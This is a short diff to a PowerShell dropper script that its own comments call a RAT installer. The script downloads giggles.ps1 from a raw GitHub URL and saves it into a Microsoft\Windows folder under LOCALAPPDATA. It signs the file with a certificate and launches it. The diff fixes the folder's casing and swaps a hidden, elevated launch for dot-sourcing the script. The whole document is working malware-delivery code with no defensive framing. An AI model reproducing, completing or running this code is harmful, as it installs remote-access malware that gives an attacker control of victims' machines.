@@ -35,7 +35,7 @@ if (-not (Test-Connection -Count 1 -Quiet github.com)) {
 }
 
 # Download the RAT to appdata\local
-$Save2Path = "$env:LOCALAPPDATA\microsoft\Windows\"
+$Save2Path = "$env:LOCALAPPDATA\Microsoft\Windows\"
 $URL = "https://raw.githubusercontent.com/NetConnectors/4seShitzNGiggles/main/n/giggles.ps1"
 
 # Check if the directory exists
@@ -60,7 +60,7 @@ try {
     Set-AuthenticodeSignature -Certificate $Cert -FilePath "$Save2Path\giggles.ps1" | Out-Null
 
     # Start the RAT
-    powershell "$Save2Path\giggles.ps1 -run init" -Verb RunAs -WindowStyle Hidden | Out-Null
+    ."$Save2Path\giggles.ps1"  -run init
 }
 catch {
     Write-Warning "Failed to sign the RAT!`nPlease check your certificate and try again!"
